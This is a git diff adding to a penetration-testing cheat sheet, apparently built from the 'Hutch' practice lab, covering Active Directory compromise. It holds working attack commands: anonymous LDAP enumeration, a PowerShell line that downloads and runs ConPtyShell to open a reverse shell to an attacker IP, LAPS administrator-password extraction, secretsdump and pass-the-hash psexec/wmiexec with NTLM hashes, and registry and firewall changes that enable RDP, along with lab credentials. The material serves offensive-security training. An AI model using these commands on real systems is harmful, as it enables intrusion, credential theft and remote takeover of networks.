@@ -1125,8 +1125,14 @@ nc -nlvp 4444>whoami
 ```
 
 ## LDAP Enumeration
+- If want login with ldap ports 389, 636, 3268, 3269 anonymously login get details like usernames and passwords
 
 ```powershell
+# ldap Aonnymous login ports 389, 636, 3268, 3269 hutch PG Practice
+ldapsearch -x -H ldap://192.168.104.122 -D '' -w '' -b "DC=hutch,DC=offsec"
+nxc ldap 192.168.104.122 -u '' -p '' -M get-desc-users # Get users information if it has anonymous login
+
+
 ldapsearch -x -H ldap://<IP>:<port> # try on both ldap and ldaps, this is first command to run if you dont have any valid credentials.
 
 ldapsearch -x -H ldap://<IP> -D '' -w '' -b "DC=<1_SUBDOMAIN>,DC=<TLD>"
@@ -1226,11 +1232,20 @@ result was NT_STATUS_PASSWORD_RESTRICTION
 rpcclient $> setuserinfo2 audit2020 23 'Ashok@123'
 rpcclient $>
 # Password created successful
-
-
-
 ```
 
+### WIndows conpty shell
+- In windows we can interactive have reverse shell with autocomplete features using the [ConPtyShell](https://github.com/antonioCoco/ConPtyShell)
+- If you have the Windows recode code execution in the browser so we can get a fully interactive shell [Hutch PG Pracice](https://www.youtube.com/watch?v=yI6nN8o3YUY)
+
+```powershell
+# Windows cmd shell in path "put /usr/share/webshells/aspx/cmdasp.aspx"
+# Kali Linux
+stty raw -echo; (stty size; cat) | nc -lvnp 80 #interactive shell with auto complete 
+# Windows shell
+IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell <KALI-IP> 3001
+powershell IEX(IWR http://192.168.45.227:8080/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.45.227 80 #target don't have NET access, share through kali box
+```
 ---
 
 # Web Attacks
@@ -2526,6 +2541,10 @@ rpcclient $> querygroup <Group RID>
 rpcclient $> querygroupmem <Group RID>
 rpcclient $> enumdomusers
 rpcclient $> queryuser <User RID> # You will get in querygroupmem <Group RID>
+
+
+# enum4linux https://juggernaut-sec.com/proving-grounds-hutch/
+enum4linux -u fmcsorley -p CrabSharkJellyfish192 -a 192.168.154.122 
 ```
 
 - Check user in administrators group or not
@@ -2828,9 +2847,47 @@ atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68a
 ```powershell
 winrs -r:<computername> -u:<user> -p:<password> "command"
 # run this and check whether the user has access on the machine, if you have access then run a powershell reverse-shell
-# run this on windows session
+# run this on Windows session
+```
+### laps password in windows Active Diretory ms-Mcs-AdmPwd
+- In active directory the user can read the administrator password using the <b>ReadLAPSPassword</b> permission [Hutch PG Practice](https://juggernaut-sec.com/proving-grounds-hutch/)
+- In the bloodhound Analysis ->  'Shortest Paths to High-Value Targets' user has ReadLAPSPassword using that able to read the administrator password. [youtube](https://www.youtube.com/watch?v=yI6nN8o3YUY) complete laps procedure
+- Reference [LAPS payloadAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/pwd-read-laps/#extract-laps-password), [pyLAPS](https://github.com/p0dalirius/pyLAPS)
+```powershell
+# Intially identified users netexec 
+netexec ldap 192.168.154.122 -u '' -p '' -M get-desc-users
+# or you can find same ldapsearch
+ldapsearch -x -h 192.168.154.122 -b "dc=hutch,dc=offsec" > ldap_search.txt
+cat raw_users.txt | cut -d: -f2 | tr -d " " > users_ldap.txt
+cat ldap_search.txt | grep -i description  # Found password in description
+crackmapexec smb 192.168.154.122 -u ./users.txt -p ./passwords.txt --continue-on-success # Checking which which user password
+# Bloodhound this tool available on kali linux
+bloodhound-python -u fmcsorley -p 'CrabSharkJellyfish192' -ns 192.168.154.122 -d hutch.offsec -c all
+#powerview.ps1
+. .\powerview.ps1
+Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReferenceName -match "fmcsorley"}
+ldapsearch -H ldap://192.168.154.122 -b 'DC=hutch,DC=offsec' -x -D 'fmcsorley@hutch.offsec' -w 'CrabSharkJellyfish192' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd # ldapsearch get laps  admin password
+ldapsearch -h 192.168.154.122 -b 'DC=hutch,DC=offsec' -x -D 'fmcsorley@hutch.offsec' -w 'CrabSharkJellyfish192' "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd # Sometimes above is not work
+netexec ldap 192.168.154.122 -u fmcsorley -p CrabSharkJellyfish192 --kdcHost 192.168.154.122 -M laps
+netexec ldap 192.168.154.122 -u 'fmcsorley' -p 'CrabSharkJellyfish192' -M laps # same like above
+python3 pyLAPS.py --action get -u 'fmcsorley' -d 'hutch.offsec' -p 'CrabSharkJellyfish192' --dc-ip 192.168.154.122 # LAPS, pyLAPS
+# I also added a few known account names such as administrator and krbtgt
+netexec smb 192.168.154.122 -u users_ldap.txt -p password.txt --continue-on-success # Admin 'BJhN#,lU/9gvqN'
+# Privilege Escalation
+impacket-secretsdump hutch.offsec/administrator:'BJhN#,lU/9gvqN'@192.168.154.122
+impacket-wmiexec administrator:'BJhN#,lU/9gvqN'@192.168.154.122 # Admin
+impacket-psexec administrator:'BJhN#,lU/9gvqN'@192.168.154.122 # Admin
+impacket-wmiexec -hashes 'aad3b435b51404eeaad3b435b51404ee:8730fa0d1014eb78c61e3957aa7b93d7' domainadmin@192.168.154.122 # domainadmin able to read proof.txt
+impacket-psexec -hashes 'aad3b435b51404eeaad3b435b51404ee:8730fa0d1014eb78c61e3957aa7b93d7' domainadmin@192.168.154.122 # Admin
 ```
 
+### Enable RDP with PowerShell windows
+- Enabling RDP with powershell [resource](https://www.helpwire.app/blog/powershell-enable-remote-desktop/)
+```powershell
+Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
+Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+xfreerdp /u:administrator /p:'BJhN#,lU/9gvqN' /v:192.168.154.122 /smart-sizing:1920x1080 /cert-ignore
+```
 ### crackmapexec
 
 - If stuck make use of [Wiki](https://www.crackmapexec.wiki/)
